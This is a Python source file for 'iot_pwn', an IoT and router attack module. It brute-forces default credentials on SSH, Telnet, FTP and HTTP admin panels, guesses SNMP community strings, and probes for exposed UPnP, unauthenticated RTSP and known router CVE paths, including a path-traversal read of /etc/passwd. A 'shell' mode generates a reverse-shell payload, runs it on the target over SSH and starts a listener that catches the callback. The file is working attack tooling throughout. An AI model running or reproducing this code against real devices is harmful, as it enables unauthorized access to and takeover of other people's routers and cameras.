#!/usr/bin/env python3
"""
iot_pwn — IoT/Router Attack Module for secV
Default credential attacks, SNMP bruteforce, UPnP discovery,
RTSP no-auth check, HTTP admin panel discovery.
Inspired by routersploit toolset features.
"""

import sys
import os
import json
import socket
import ftplib
import threading
import time
import re
import struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
import importlib.util as _ilu

# ── OnlyShell reverse shell handler ──────────────────────────────────────────
def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "0.0.0.0"

_RS_MOD = None
def _rs():
    global _RS_MOD
    if _RS_MOD is not None:
        return _RS_MOD
    for _c in [
        Path(__file__).parent.parent / "revshell" / "revshell.py",
        Path(__file__).parent / "revshell" / "revshell.py",
    ]:
        if _c.exists():
            _s = _ilu.spec_from_file_location("revshell", _c)
            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
            _RS_MOD = _m; return _m
    return None

# ── Optional imports ──────────────────────────────────────────────────────────
try:
    import requests as _requests
    _requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import paramiko as _paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

# ── Colour helpers ─────────────────────────────────────────────────────────────
_R  = '\033[0m'
_B  = '\033[1m'
_RD = '\033[91m'
_GR = '\033[92m'
_YL = '\033[93m'
_CY = '\033[96m'
_WH = '\033[97m'
_DM = '\033[2m'

# ── Default credentials (embedded from routersploit + additional IoT defaults) ─
DEFAULT_CREDS: List[Tuple[str, str]] = [
    ('admin',         'admin'),
    ('admin',         'password'),
    ('admin',         '1234'),
    ('admin',         '12345'),
    ('admin',         '123456'),
    ('admin',         ''),
    ('admin',         'admin123'),
    ('admin',         'pass'),
    ('admin',         'letmein'),
    ('admin',         'changeme'),
    ('admin',         'default'),
    ('admin',         '0000'),
    ('admin',         '1111'),
    ('admin',         'administrator'),
    ('administrator', 'administrator'),
    ('administrator', 'admin'),
    ('administrator', 'password'),
    ('administrator', ''),
    ('administrator', '1234'),
    ('root',          'root'),
    ('root',          'admin'),
    ('root',          'password'),
    ('root',          ''),
    ('root',          '12345'),
    ('root',          'toor'),
    ('root',          'pass'),
    ('root',          '1234'),
    ('root',          'rootpass'),
    ('root',          'alpine'),
    ('user',          'user'),
    ('user',          'password'),
    ('user',          '1234'),
    ('user',          ''),
    ('guest',         'guest'),
    ('guest',         ''),
    ('guest',         'password'),
    ('support',       'support'),
    ('support',       ''),
    ('operator',      'operator'),
    ('operator',      '1234'),
    ('tech',          'tech'),
    ('service',       'service'),
    ('ubnt',          'ubnt'),
    ('pi',            'raspberry'),
    ('cisco',         'cisco'),
    ('cisco',         ''),
    ('enable',        'enable'),
    ('Manager',       'Manager'),
    ('Admin',         'Admin'),
    ('Admin',         'admin'),
    ('Admin',         ''),
    ('ADMIN',         'ADMIN'),
    ('Admin',         '5up'),
    ('admin1',        'password'),
    ('supervisor',    'supervisor'),
    ('superuser',     'superuser'),
    ('netgear',       'netgear'),
    ('linksys',       'linksys'),
    ('motorola',      'motorola'),
    ('default',       'default'),
    ('1234',          '1234'),
    ('666666',        '666666'),
    ('888888',        '888888'),
    ('1111',          '1111'),
    ('admin',         'huawei'),
    ('admin',         'zte'),
    ('admin',         'fiberhome'),
    ('adminpldt',     'adminpldt'),
    ('telecomadmin',  'admintelecom'),
    ('useradmin',     'pass'),
    ('Admin',         'Zte521'),
    ('admin',         'Zte521'),
    ('admin',         'ZTE521'),
    ('admin',         'Fj@12345'),
]

SNMP_COMMUNITIES: List[str] = [
    'public', 'private', 'community', 'admin', 'default', 'secret',
    'cisco', 'monitor', 'manager', 'read', 'write', 'all', 'password',
    'snmp', 'public2', 'network', 'system', 'test', 'security',
    '0', 'internal', 'ro', 'rw', 'rwa', 'world',
]

HTTP_ADMIN_PATHS: List[str] = [
    '/', '/admin', '/admin/', '/administration', '/manager',
    '/login', '/login.asp', '/login.html', '/login.php',
    '/index.html', '/index.asp', '/index.php',
    '/cgi-bin/luci', '/luci', '/webadmin',
    '/web/', '/webui', '/ui', '/gui',
    '/admin.cgi', '/management', '/setup',
    '/userRpm', '/RPCProxy/ubnt', '/api/v1',
    '/HNAP1/', '/goform/login',
    '/adm/login.asp', '/adm/',
    '/manage/account/login',
]

ROUTER_CVE_CHECKS: List[Dict] = [
    {
        'id':   'CVE-2017-17215',
        'desc': 'Huawei HG532 remote code execution via UPnP',
        'path': '/ctrlt/DeviceUpgrade_1',
        'method': 'POST',
        'match': ['HuaweiHomeGateway', 'Huawei'],
        'cvss': 8.8,
    },
    {
        'id':   'CVE-2020-9054',
        'desc': 'Zyxel NAS default credentials + RCE',
        'path': '/cgi-bin/weblogin.cgi',
        'match': ['Zyxel', 'zyxel'],
        'cvss': 9.8,
    },
    {
        'id':   'CVE-2021-20090',
        'desc': 'Arcadyan router authentication bypass',
        'path': '/images/..%2f..%2f..%2ftmp/etc/passwd',
        'match': ['Arcadyan', 'arcadyan'],
        'cvss': 9.1,
    },
    {
        'id':   'DLINK-BACKDOOR',
        'desc': 'D-Link authentication bypass via User-Agent',
        'path': '/cgi-bin/mainFrame.cgi',
        'match': ['D-Link', 'd-link', 'dlink'],
        'cvss': 9.1,
    },
]

# ── Utility ────────────────────────────────────────────────────────────────────

def _tcp_open(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        rc = s.connect_ex((ip, port))
        s.close()
        return rc == 0
    except Exception:
        return False


def _udp_probe(ip: str, port: int, data: bytes, timeout: float = 2.0) -> Optional[bytes]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(data, (ip, port))
        resp, _ = s.recvfrom(4096)
        s.close()
        return resp
    except Exception:
        return None


# ── Attack Functions ───────────────────────────────────────────────────────────

def _ssh_check_creds(ip: str, port: int, creds: List[Tuple[str, str]],
                     timeout: float, stop_event: threading.Event) -> List[Tuple[str, str]]:
    found: List[Tuple[str, str]] = []
    if not HAS_PARAMIKO:
        return found
    for user, passwd in creds:
        if stop_event.is_set():
            break
        try:
            cli = _paramiko.SSHClient()
            cli.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
            cli.connect(ip, port=port, username=user, password=passwd,
                        timeout=timeout, look_for_keys=False, allow_agent=False,
                        banner_timeout=timeout)
            cli.close()
            found.append((user, passwd))
            stop_event.set()
        except _paramiko.AuthenticationException:
            pass
        except Exception:
            break
    return found


def _telnet_recv_until(s: socket.socket, markers: List[bytes],
                        timeout: float) -> bytes:
    s.settimeout(timeout)
    buf = b''
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = s.recv(256)
            if not chunk:
                break
            # strip IAC negotiation bytes
            i = 0
            while i < len(chunk):
                if chunk[i] == 0xFF and i + 2 < len(chunk):
                    i += 3
                else:
                    buf += bytes([chunk[i]])
                    i += 1
            if any(m in buf for m in markers):
                break
        except socket.timeout:
            break
        except Exception:
            break
    return buf


def _telnet_check_creds(ip: str, port: int, creds: List[Tuple[str, str]],
                         timeout: float, stop_event: threading.Event) -> List[Tuple[str, str]]:
    found: List[Tuple[str, str]] = []
    for user, passwd in creds:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            data = _telnet_recv_until(s, [b'ogin:', b'Login:'], timeout)
            s.sendall(user.encode() + b'\r\n')
            data = _telnet_recv_until(s, [b'assword:', b'Password:'], timeout)
            s.sendall(passwd.encode() + b'\r\n')
            data = _telnet_recv_until(s, [b'#', b'$', b'>', b'%'], timeout)
            if b'#' in data or b'$' in data or b'>' in data:
                found.append((user, passwd))
                stop_event.set()
            s.close()
        except Exception:
            pass
    return found


def _ftp_check_creds(ip: str, port: int, creds: List[Tuple[str, str]],
                      timeout: float, stop_event: threading.Event) -> List[Tuple[str, str]]:
    found: List[Tuple[str, str]] = []
    for user, passwd in creds:
        if stop_event.is_set():
            break
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=timeout)
            ftp.login(user, passwd)
            ftp.quit()
            found.append((user, passwd))
            stop_event.set()
        except ftplib.error_perm:
            pass
        except Exception:
            pass
    return found


def _http_check_creds(ip: str, port: int, creds: List[Tuple[str, str]],
                       paths: List[str], ssl: bool, timeout: float,
                       stop_event: threading.Event) -> Tuple[List[Tuple[str, str]], List[str]]:
    found_creds: List[Tuple[str, str]] = []
    found_panels: List[str] = []
    if not HAS_REQUESTS:
        return found_creds, found_panels

    scheme = 'https' if ssl else 'http'
    base = f'{scheme}://{ip}:{port}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; secV-iotpwn)',
    }

    # Discover admin panels first
    for path in paths[:15]:
        if stop_event.is_set():
            break
        try:
            r = _requests.get(f'{base}{path}', headers=headers, timeout=timeout,
                              verify=False, allow_redirects=True)
            if r.status_code in (200, 401, 403, 302):
                if any(kw in r.text.lower() for kw in
                       ['login', 'username', 'password', 'user name', 'admin',
                        'sign in', 'authenticate', 'router', 'wireless']):
                    if path not in found_panels:
                        found_panels.append(path)
        except Exception:
            pass

    # Check 401 paths for default creds
    auth_paths = found_panels or ['/']
    for path in auth_paths[:5]:
        for user, passwd in creds:
            if stop_event.is_set():
                break
            try:
                r = _requests.get(
                    f'{base}{path}', headers=headers,
                    auth=(user, passwd), timeout=timeout,
                    verify=False, allow_redirects=False,
                )
                if r.status_code in (200, 302) and (user, passwd) not in found_creds:
                    found_creds.append((user, passwd))
                    stop_event.set()
            except Exception:
                pass

    return found_creds, found_panels


def _snmp_check(ip: str, port: int, communities: List[str],
                timeout: float) -> Tuple[List[str], Dict]:
    valid_communities: List[str] = []
    sys_info: Dict = {}

    for community in communities:
        try:
            # SNMP v2c GET request for sysDescr (OID 1.3.6.1.2.1.1.1.0)
            oid = b'\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00'
            comm = community.encode()
            pdu = (
                b'\x02\x01\x00'         # version v1
                + b'\x04' + bytes([len(comm)]) + comm
                + b'\xa0\x1a'           # GetRequest PDU
                + b'\x02\x04\x00\x00\x00\x01'  # request-id
                + b'\x02\x01\x00'       # error-status
                + b'\x02\x01\x00'       # error-index
                + b'\x30\x0c\x30\x0a'  # variable bindings
                + oid
                + b'\x05\x00'           # null value
            )
            packet = b'\x30' + bytes([len(pdu)]) + pdu

            resp = _udp_probe(ip, port, packet, timeout)
            if resp and len(resp) > 10:
                valid_communities.append(community)
                # Try to extract sysDescr string from response
                try:
                    idx = resp.find(b'\x04')
                    if idx > 0:
                        slen = resp[idx + 1]
                        desc = resp[idx + 2: idx + 2 + slen].decode(errors='replace')
                        if desc:
                            sys_info['sysDescr'] = desc[:200]
                except Exception:
                    pass
                break
        except Exception:
            pass

    return valid_communities, sys_info


def _rtsp_check(ip: str, port: int, timeout: float) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        req = (f'OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n'
               f'CSeq: 1\r\nUser-Agent: secV-iotpwn\r\n\r\n').encode()
        s.sendall(req)
        resp = s.recv(512).decode(errors='replace')
        s.close()
        return 'RTSP/1.0 200' in resp or 'Public:' in resp
    except Exception:
        return False


def _upnp_check(ip: str, timeout: float) -> Dict:
    result: Dict = {}
    try:
        msearch = (
            'M-SEARCH * HTTP/1.1\r\n'
            f'HOST: {ip}:1900\r\n'
            'MAN: "ssdp:discover"\r\n'
            'MX: 3\r\n'
            'ST: ssdp:all\r\n\r\n'
        ).encode()
        resp = _udp_probe(ip, 1900, msearch, timeout)
        if resp:
            text = resp.decode(errors='replace')
            result['exposed'] = True
            for line in text.split('\r\n'):
                line_l = line.lower()
                if line_l.startswith('location:'):
                    result['location'] = line.split(':', 1)[1].strip()
                elif line_l.startswith('server:'):
                    result['server'] = line.split(':', 1)[1].strip()
                elif line_l.startswith('st:'):
                    result['type'] = line.split(':', 1)[1].strip()
    except Exception:
        pass
    return result


def _http_get_banner(ip: str, port: int, ssl: bool, timeout: float) -> Dict:
    if not HAS_REQUESTS:
        return {}
    try:
        scheme = 'https' if ssl else 'http'
        r = _requests.get(f'{scheme}://{ip}:{port}/', timeout=timeout,
                          verify=False, allow_redirects=True,
                          headers={'User-Agent': 'secV-iotpwn/1.0'})
        info: Dict = {'status': r.status_code}
        srv = r.headers.get('Server', '')
        if srv:
            info['server'] = srv
        title_m = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I | re.S)
        if title_m:
            info['title'] = title_m.group(1).strip()[:80]
        info['auth_required'] = r.status_code == 401
        return info
    except Exception:
        return {}


def _http_cve_check(ip: str, port: int, ssl: bool,
                    banner: Dict, timeout: float) -> List[Dict]:
    findings: List[Dict] = []
    if not HAS_REQUESTS:
        return findings
    scheme = 'https' if ssl else 'http'
    server_str = (banner.get('server', '') + ' ' + banner.get('title', '')).lower()

    for cve in ROUTER_CVE_CHECKS:
        if not any(m.lower() in server_str for m in cve['match']):
            continue
        try:
            if cve['method'] == 'POST':
                r = _requests.post(f'{scheme}://{ip}:{port}{cve["path"]}',
                                   timeout=timeout, verify=False)
            else:
                r = _requests.get(f'{scheme}://{ip}:{port}{cve["path"]}',
                                  timeout=timeout, verify=False)
            if r.status_code in (200, 500):
                findings.append({
                    'id':   cve['id'],
                    'desc': cve['desc'],
                    'cvss': cve['cvss'],
                    'severity': 'CRITICAL' if cve['cvss'] >= 9 else 'HIGH',
                    'port': port,
                })
        except Exception:
            pass
    return findings


# ── Main module ────────────────────────────────────────────────────────────────

class IotPwn:
    def __init__(self, context: Dict):
        self.target        = context.get('target', '').strip()
        params             = context.get('params', {})
        self.context_params = params
        self.ports    = params.get('ports', '')
        self.threads  = int(params.get('threads', 20))
        self.timeout  = float(params.get('timeout', 3.0))
        self.mode     = params.get('mode', 'default').lower()
        self.check_ssh     = self._bool(params.get('ssh',     True))
        self.check_telnet  = self._bool(params.get('telnet',  True))
        self.check_ftp     = self._bool(params.get('ftp',     True))
        self.check_http    = self._bool(params.get('http',    True))
        self.check_snmp    = self._bool(params.get('snmp',    True))
        self.check_rtsp    = self._bool(params.get('rtsp',    True))
        self.check_upnp    = self._bool(params.get('upnp',    True))
        self.max_creds     = int(params.get('max_creds', len(DEFAULT_CREDS)))
        self.errors:   List[str] = []

    @staticmethod
    def _bool(v) -> bool:
        if isinstance(v, bool):
            return v
        return str(v).lower() in ('true', '1', 'yes', 'on')

    def _shell_operation(self) -> Dict:
        """OnlyShell handler: auto-deliver via SSH if creds found, then catch shell."""
        lhost    = self.context_params.get('lhost') or _local_ip()
        lport    = int(self.context_params.get('lport', 4444))
        serve    = str(self.context_params.get('serve', 'true')).lower() in ('true', '1', 'yes')
        duration = int(self.context_params.get('duration', 60))
        ptype    = self.context_params.get('payload_type', 'bash_tcp')
        ssh_user = self.context_params.get('ssh_user', '')
        ssh_pass = self.context_params.get('ssh_pass', '')
        rs = _rs()
        if rs is None:
            return {'success': False, 'errors': ['revshell module not found']}
        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
        if not gen.get('success'):
            return {'success': False, 'errors': [f"payload gen: {gen.get('error')}"]}
        payload = list(gen['payloads'].values())[0]
        result = {'lhost': lhost, 'lport': lport, 'payload_type': ptype,
                  'payload': payload, 'listener': f"nc -lvnp {lport}",
                  'target': self.target}
        if HAS_PARAMIKO and ssh_user and ssh_pass:
            def _deliver():
                try:
                    cli = _paramiko.SSHClient()
                    cli.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
                    cli.connect(self.target, username=ssh_user, password=ssh_pass,
                                timeout=10, look_for_keys=False, allow_agent=False)
                    cli.exec_command(payload)
                except Exception:
                    pass
            print(f'[*] Delivering {ptype} to {self.target} via SSH…', file=sys.stderr)
            threading.Thread(target=_deliver, daemon=True).start()
            result['delivery'] = f'auto ({ptype} via SSH {ssh_user}@{self.target})'
        else:
            result['delivery'] = 'manual — provide ssh_user + ssh_pass for auto-delivery'
            print(f'[*] Copy payload to target: {payload[:80]}', file=sys.stderr)
        print(f'[*] Starting reverse shell handler on {lhost}:{lport}…', file=sys.stderr)
        if serve:
            rs.op_serve([lport], lhost=lhost)
            return {'success': True, **result}
        r = rs.op_listen([lport], duration=duration, lhost=lhost)
        result.update({'sessions': r.get('sessions', []),
                       'sessions_count': r.get('sessions_count', 0)})
        return {'success': True, **result}

    def execute(self) -> Dict:
        if not self.target:
            return {'success': False, 'errors': ['No target specified']}

        if self.mode == 'shell':
            return self._shell_operation()

        ip = self.target
        t0 = time.time()

        print(f'[*] Scanning {ip} for IoT/router services...', file=sys.stderr)

        # ── Port detection ─────────────────────────────────────────────────
        candidates = {
            21:   'ftp',
            22:   'ssh',
            23:   'telnet',
            80:   'http',
            443:  'https',
            554:  'rtsp',
            7000: 'rtsp-airtunes',
            8554: 'rtsp-alt',
            8080: 'http-alt',
            8443: 'https-alt',
            8888: 'http-mgmt',
            9090: 'http-mgmt2',
            1900: 'upnp',
            5000: 'http-app',
        }

        open_tcp: Dict[int, str] = {}
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            port_futs = {ex.submit(_tcp_open, ip, p, self.timeout): p
                         for p in candidates}
            for fut in as_completed(port_futs):
                p = port_futs[fut]
                if fut.result():
                    open_tcp[p] = candidates[p]

        print(f'[*] Open TCP ports: {sorted(open_tcp.keys()) or "none"}', file=sys.stderr)

        findings: Dict = {
            'target':    ip,
            'open_ports': sorted(open_tcp.keys()),
            'creds': {},
            'snmp': {},
            'upnp': {},
            'rtsp': False,
            'admin_panels': [],
            'http_banners': {},
            'vulnerabilities': [],
        }

        creds_to_try = DEFAULT_CREDS[:self.max_creds]
        stop_events: Dict[str, threading.Event] = {}

        # ── HTTP banners + CVE checks ──────────────────────────────────────
        for port, svc in list(open_tcp.items()):
            if not self.check_http:
                break
            if svc not in ('http', 'https', 'http-alt', 'https-alt', 'http-mgmt', 'http-mgmt2'):
                continue
            ssl = svc in ('https', 'https-alt')
            print(f'[*] HTTP fingerprint on {ip}:{port}...', file=sys.stderr)
            banner = _http_get_banner(ip, port, ssl, self.timeout)
            if banner:
                findings['http_banners'][port] = banner
                cve_hits = _http_cve_check(ip, port, ssl, banner, self.timeout)
                findings['vulnerabilities'].extend(cve_hits)

        # ── Concurrent service attacks ─────────────────────────────────────
        with ThreadPoolExecutor(max_workers=8) as ex:
            futs = {}

            if self.check_ssh and 22 in open_tcp and HAS_PARAMIKO:
                e = threading.Event()
                stop_events['ssh'] = e
                print(f'[*] Testing SSH default creds ({len(creds_to_try)})...', file=sys.stderr)
                futs[ex.submit(_ssh_check_creds, ip, 22, creds_to_try, self.timeout, e)] = 'ssh'

            if self.check_telnet and 23 in open_tcp:
                e = threading.Event()
                stop_events['telnet'] = e
                print(f'[*] Testing Telnet default creds...', file=sys.stderr)
                futs[ex.submit(_telnet_check_creds, ip, 23, creds_to_try, self.timeout, e)] = 'telnet'

            if self.check_ftp and 21 in open_tcp:
                e = threading.Event()
                stop_events['ftp'] = e
                print(f'[*] Testing FTP default creds...', file=sys.stderr)
                futs[ex.submit(_ftp_check_creds, ip, 21, creds_to_try, self.timeout, e)] = 'ftp'

            if self.check_http and HAS_REQUESTS:
                for port in [p for p in (80, 8080, 443, 8443, 8888, 9090) if p in open_tcp]:
                    ssl = port in (443, 8443)
                    e = threading.Event()
                    key = f'http_{port}'
                    stop_events[key] = e
                    print(f'[*] Testing HTTP admin creds on port {port}...', file=sys.stderr)
                    futs[ex.submit(_http_check_creds, ip, port, creds_to_try,
                                   HTTP_ADMIN_PATHS, ssl, self.timeout, e)] = key

            if self.check_rtsp:
                for port in [554, 7000, 8554]:
                    if port in open_tcp or _tcp_open(ip, port, self.timeout):
                        print(f'[*] Checking RTSP on port {port}...', file=sys.stderr)
                        futs[ex.submit(_rtsp_check, ip, port, self.timeout)] = f'rtsp_{port}'

            if self.check_snmp:
                print(f'[*] Testing SNMP community strings...', file=sys.stderr)
                futs[ex.submit(_snmp_check, ip, 161, SNMP_COMMUNITIES, self.timeout)] = 'snmp'

            if self.check_upnp:
                print(f'[*] Checking UPnP SSDP...', file=sys.stderr)
                futs[ex.submit(_upnp_check, ip, self.timeout)] = 'upnp'

            done_futs = set()
            try:
                for fut in as_completed(futs, timeout=90):
                    done_futs.add(fut)
            except Exception:
                pass
            for fut in list(futs.keys()):
                tag = futs[fut]
                try:
                    result = fut.result(timeout=0.1)
                    if tag == 'ssh' and result:
                        findings['creds']['ssh'] = [{'user': u, 'pass': p} for u, p in result]
                    elif tag == 'telnet' and result:
                        findings['creds']['telnet'] = [{'user': u, 'pass': p} for u, p in result]
                    elif tag == 'ftp' and result:
                        findings['creds']['ftp'] = [{'user': u, 'pass': p} for u, p in result]
                    elif tag.startswith('http_') and isinstance(result, tuple):
                        port_n = int(tag.split('_')[1])
                        creds_found, panels = result
                        if creds_found:
                            findings['creds'][f'http_{port_n}'] = [
                                {'user': u, 'pass': p} for u, p in creds_found
                            ]
                        if panels:
                            for panel in panels:
                                entry = f'{port_n}{panel}'
                                if entry not in findings['admin_panels']:
                                    findings['admin_panels'].append(entry)
                    elif tag.startswith('rtsp_') and result:
                        findings['rtsp'] = True
                        port_n = int(tag.split('_')[1])
                        findings['vulnerabilities'].append({
                            'id':       'RTSP-NO-AUTH',
                            'desc':     f'RTSP stream accessible without authentication on port {port_n}',
                            'severity': 'HIGH',
                            'cvss':     7.5,
                            'port':     port_n,
                        })
                    elif tag == 'snmp' and isinstance(result, tuple):
                        communities, sys_info = result
                        if communities:
                            findings['snmp']['valid_communities'] = communities
                            findings['snmp']['sys_info'] = sys_info
                            findings['vulnerabilities'].append({
                                'id':       'SNMP-WEAK-COMMUNITY',
                                'desc':     f'SNMP accessible with community: {communities[0]}',
                                'severity': 'MEDIUM',
                                'cvss':     5.3,
                                'port':     161,
                            })
                    elif tag == 'upnp' and result.get('exposed'):
                        findings['upnp'] = result
                        findings['vulnerabilities'].append({
                            'id':       'UPNP-EXPOSED',
                            'desc':     f'UPnP SSDP exposed — server: {result.get("server", "unknown")}',
                            'severity': 'MEDIUM',
                            'cvss':     5.3,
                            'port':     1900,
                        })
                except Exception as e:
                    self.errors.append(f'{tag}: {e}')

        # Mark found creds as vulnerabilities
        _svc_port = {'ssh': 22, 'telnet': 23, 'ftp': 21}
        for svc, cred_list in findings['creds'].items():
            port_n = (_svc_port.get(svc)
                      or (int(svc.split('_')[1]) if '_' in svc and svc.split('_')[1].isdigit() else 80))
            for cred in cred_list:
                findings['vulnerabilities'].append({
                    'id':       f'DEFAULT-CREDS-{svc.upper()}',
                    'desc':     f'Default credentials valid on {svc}: {cred["user"]}:{cred["pass"]}',
                    'severity': 'CRITICAL',
                    'cvss':     9.8,
                    'port':     port_n,
                })

        duration = round(time.time() - t0, 1)
        findings['scan_duration'] = duration
        findings['errors'] = self.errors

        vuln_counts = {
            'critical': sum(1 for v in findings['vulnerabilities'] if v.get('severity') == 'CRITICAL'),
            'high':     sum(1 for v in findings['vulnerabilities'] if v.get('severity') == 'HIGH'),
            'medium':   sum(1 for v in findings['vulnerabilities'] if v.get('severity') == 'MEDIUM'),
            'total':    len(findings['vulnerabilities']),
        }
        findings['summary'] = {
            'creds_found':    sum(len(c) for c in findings['creds'].values()),
            'vulns':          vuln_counts,
            'admin_panels':   len(findings['admin_panels']),
            'snmp_exposed':   bool(findings['snmp']),
            'upnp_exposed':   bool(findings['upnp'].get('exposed')),
            'rtsp_no_auth':   findings['rtsp'],
        }

        return {'success': True, 'data': findings}


# ── Report ─────────────────────────────────────────────────────────────────────

def print_report(result: Dict) -> None:
    if not result.get('success'):
        errs = result.get('errors', ['unknown error'])
        print(f'\n{_RD}  FAILED:{_R} {"; ".join(errs)}\n')
        return

    d   = result.get('data', {})
    ip  = d.get('target', '?')
    dur = f'{d.get("scan_duration", 0):.1f}s'
    sm  = d.get('summary', {})
    vulns = d.get('vulnerabilities', [])
    creds = d.get('creds', {})
    snmp  = d.get('snmp', {})
    upnp  = d.get('upnp', {})
    ports = d.get('open_ports', [])
    panels= d.get('admin_panels', [])
    banners = d.get('http_banners', {})

    W = 70
    print()
    print(f'  {_B}{_WH}IOT_PWN{_R}  {_CY}{ip}{_R}  ·  {dur}')
    print(_DM + '═' * W + _R)
    print(f'  {_DM}open ports  {_R}{" ".join(str(p) for p in ports) or "none"}')

    crit = sm.get('vulns', {}).get('critical', 0)
    high = sm.get('vulns', {}).get('high', 0)
    med  = sm.get('vulns', {}).get('medium', 0)
    tot  = sm.get('vulns', {}).get('total', 0)
    if tot:
        cr_s = f'{_RD}{crit} critical{_R}' if crit else f'{_DM}0 critical{_R}'
        hi_s = f'{_RD}{high} high{_R}'     if high else f'{_DM}0 high{_R}'
        me_s = f'{_YL}{med} medium{_R}'    if med  else f'{_DM}0 medium{_R}'
        print(f'  {cr_s}  {hi_s}  {me_s}  {_DM}·  {tot} total{_R}')
    else:
        print(f'  {_DM}no vulnerabilities found{_R}')
    print()

    # HTTP banners
    if banners:
        print(f'{_DM}─── HTTP Banners {"─"*(W-14)}{_R}')
        for port, info in banners.items():
            srv = info.get('server', '')
            title = info.get('title', '')
            status = info.get('status', '')
            auth = f'{_YL}[auth required]{_R}' if info.get('auth_required') else ''
            print(f'  {_YL}{port}/tcp{_R}  {_DM}{status}{_R}  {srv or title}  {auth}')
        print()

    # Admin panels
    if panels:
        print(f'{_DM}─── Admin Panels {"─"*(W-15)}{_R}')
        for p in panels[:10]:
            print(f'  {_CY}►{_R} /{p}')
        print()

    # Credentials found
    if creds:
        print(f'{_DM}─── {_B}{_RD}DEFAULT CREDENTIALS FOUND {"─"*(W-28)}{_R}')
        for svc, cred_list in creds.items():
            for c in cred_list:
                print(f'  {_RD}▲{_R}  {_B}{svc:<12}{_R}  {_GR}{c["user"]}{_R} : {_GR}{c["pass"]}{_R}')
        print()

    # SNMP
    if snmp.get('valid_communities'):
        print(f'{_DM}─── SNMP {"─"*(W-8)}{_R}')
        print(f'  {_YL}community  {_R}{", ".join(snmp["valid_communities"])}')
        desc = snmp.get('sys_info', {}).get('sysDescr', '')
        if desc:
            print(f'  {_DM}sysDescr   {_R}{desc[:70]}')
        print()

    # UPnP
    if upnp.get('exposed'):
        print(f'{_DM}─── UPnP {"─"*(W-8)}{_R}')
        print(f'  {_YL}SSDP exposed{_R}  server: {upnp.get("server", "?")}')
        if upnp.get('location'):
            print(f'  {_DM}location  {_R}{upnp["location"]}')
        print()

    # Vulnerabilities
    if vulns:
        print(f'{_DM}─── Vulnerabilities {"─"*(W-19)}{_R}')
        for v in sorted(vulns, key=lambda x: -x.get('cvss', 0)):
            sev = v.get('severity', 'MEDIUM')
            col = _RD if sev in ('CRITICAL', 'HIGH') else _YL
            vid = v.get('id', '')
            desc = v.get('desc', '')
            cvss = v.get('cvss', 0)
            port = v.get('port', '')
            print(f'  {col}{sev:<9}{_R}  {_B}{vid:<22}{_R}  {_DM}cvss={cvss}  port={port}{_R}')
            print(f'  {_DM}          {desc[:65]}{_R}')
        print()

    # Footer
    print(_DM + '─' * W + _R)
    cred_s = f'{_RD}{sm.get("creds_found",0)} creds cracked{_R}' if sm.get('creds_found') else f'{_DM}no creds{_R}'
    print(f'  {cred_s}  ·  {_YL}{tot} vulns{_R}')
    if d.get('errors'):
        for err in d['errors'][:3]:
            print(f'  {_DM}warn: {err[:60]}{_R}')
    print()


def show_help() -> None:
    print("""
  IOT_PWN — IoT/Router Attack Module

  USAGE
    echo '{"target":"<ip>","params":{...}}' | python3 iot_pwn.py

  PARAMETERS
    target        Target IP address
    ssh           Test SSH default credentials      (default: true)
    telnet        Test Telnet default credentials   (default: true)
    ftp           Test FTP default credentials      (default: true)
    http          Test HTTP admin panels/creds      (default: true)
    snmp          SNMP community string brute-force (default: true)
    rtsp          Check RTSP no-auth                (default: true)
    upnp          Check UPnP SSDP exposure          (default: true)
    threads       Concurrent threads                (default: 20)
    timeout       Per-connection timeout secs       (default: 3.0)
    max_creds     Max credential pairs to test      (default: all)

  EXAMPLES
    {"target":"192.168.1.1"}
    {"target":"192.168.1.1","params":{"ssh":"false","max_creds":"20"}}
    {"target":"192.168.1.1","params":{"snmp":"true","http":"true"}}
""")


def main():
    if len(sys.argv) > 1 and sys.argv[1] in ('--help', '-h', 'help'):
        show_help()
        sys.exit(0)

    if not HAS_REQUESTS:
        print('[!] Warning: requests not installed — HTTP checks disabled', file=sys.stderr)
    if not HAS_PARAMIKO:
        print('[!] Warning: paramiko not installed — SSH checks disabled', file=sys.stderr)

    raw_json = '--json' in sys.argv
    try:
        data   = json.loads(sys.stdin.read())
        result = IotPwn(data).execute()
        if raw_json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print_report(result)
    except json.JSONDecodeError as e:
        print(json.dumps({'success': False, 'errors': [f'Invalid JSON: {e}']}))
        sys.exit(1)
    except KeyboardInterrupt:
        print(json.dumps({'success': False, 'errors': ['Interrupted']}))
        sys.exit(1)
    except Exception as e:
        print(json.dumps({'success': False, 'errors': [f'Fatal: {e}']}))
        sys.exit(1)


if __name__ == '__main__':
    main()
